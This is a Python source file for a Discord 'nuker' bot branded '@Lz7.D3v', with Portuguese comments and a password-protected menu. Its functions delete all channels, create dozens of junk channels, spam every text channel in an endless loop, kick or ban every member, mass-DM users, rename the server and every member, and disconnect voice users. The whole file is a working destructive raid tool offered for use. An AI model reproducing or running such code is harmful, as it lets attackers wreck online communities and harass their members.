import discord
from discord.ext import commands
import asyncio
import os
from pystyle import Colors, Colorate
import logging

# ============== CONFIG ====================
TOKEN = "SEU_TOKEN_AQUI"
PASSWORD = "2009"

# ============== SILENCIAR LOGS ================
logging.getLogger("discord.gateway").setLevel(logging.ERROR)

# ============== BOT INSTANCE ==================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# ============== FUNÇÕES ======================
async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            print(f"[!] Sem permissão para deletar: {channel.name}")

async def create_many_channels(guild):
    for i in range(50):
        try:
            await guild.create_text_channel(name="Ownado by @Lz7.D3v")
        except:
            print("[!] Sem permissão para criar canais.")
            break

async def spam_message(guild):
    async def loop():
        while True:
            for channel in guild.text_channels:
                try:
                    await channel.send("💣 Servidor Ownado by @Lz7.D3v 💣")
                except:
                    pass
            await asyncio.sleep(1)
    asyncio.create_task(loop())

async def kick_all(guild):
    for member in guild.members:
        if not member.bot:
            try:
                await member.kick(reason="Ownado by @Lz7.D3v")
            except:
                print(f"[!] Sem permissão para kickar {member}")
            await asyncio.sleep(1)

async def ban_all(guild):
    for member in guild.members:
        if not member.bot:
            try:
                await member.ban(reason="Ownado by @Lz7.D3v")
            except:
                print(f"[!] Sem permissão para banir {member}")
            await asyncio.sleep(1)

async def dm_all(guild):
    for member in guild.members:
        if not member.bot:
            try:
                await member.send("Servidor foi ownado por @Lz7.D3v")
            except:
                print(f"[!] Falha ao enviar DM para {member}")
            await asyncio.sleep(1)

async def rename_server(guild):
    try:
        await guild.edit(name="Ownado by @Lz7.D3v")
    except:
        print("[!] Sem permissão para renomear servidor.")

async def rename_all_members(guild):
    for member in guild.members:
        if not member.bot:
            try:
                await member.edit(nick="Ownado by @Lz7.D3v")
            except:
                print(f"[!] Falha ao renomear {member}")
            await asyncio.sleep(0.5)

async def disconnect_all_voice(guild):
    for vc in guild.voice_channels:
        for member in vc.members:
            try:
                await member.move_to(None)
            except:
                print(f"[!] Falha ao desconectar {member}")

# ============ MENU VISUAL ============

ascii_banner = """\
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

                  by @Lz7.D3v
"""

menu_text = """╔══════════════════════════════════════════════════════════════╗
║ 1 - Nuke (Delete Channels)    ║ 2 - Create Channels         ║
║ 3 - Spam Channels             ║ 4 - Kick All Members        ║
║ 5 - Ban All Members           ║ 6 - DM All Users            ║
║ 7 - Rename Server             ║ 8 - Rename All Members      ║
║ 9 - Disconnect Voice Channels ║                             ║
╚══════════════════════════════════════════════════════════════╝
Escolha uma opção: """


def show_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(Colorate.Horizontal(Colors.red_to_yellow, ascii_banner, 1))
    print(Colorate.Horizontal(Colors.blue_to_white, menu_text, 1), end='')

# ============ BOT READY EVENT ============
@bot.event
async def on_ready():
    if not bot.guilds:
        print("[!] O bot não está em nenhum servidor.")
        return
    guild = bot.guilds[0]

    me = guild.me
    if not me.guild_permissions.administrator:
        print("[!] AVISO: o bot não tem permissão de ADMINISTRADOR!")

    senha = await asyncio.to_thread(input, "Digite a senha para acessar o menu: ")
    if senha != PASSWORD:
        print("Senha incorreta. Encerrando.")
        return

    while True:
        show_menu()
        escolha = (await asyncio.to_thread(input)).strip()
        if escolha == "1":
            await delete_all_channels(guild)
        elif escolha == "2":
            await create_many_channels(guild)
        elif escolha == "3":
            await spam_message(guild)
        elif escolha == "4":
            await kick_all(guild)
        elif escolha == "5":
            await ban_all(guild)
        elif escolha == "6":
            await dm_all(guild)
        elif escolha == "7":
            await rename_server(guild)
        elif escolha == "8":
            await rename_all_members(guild)
        elif escolha == "9":
            await disconnect_all_voice(guild)
        else:
            print("[!] Opção inválida.")

        await asyncio.to_thread(input, "\nPressione ENTER para voltar ao menu...")

bot.run(TOKEN)
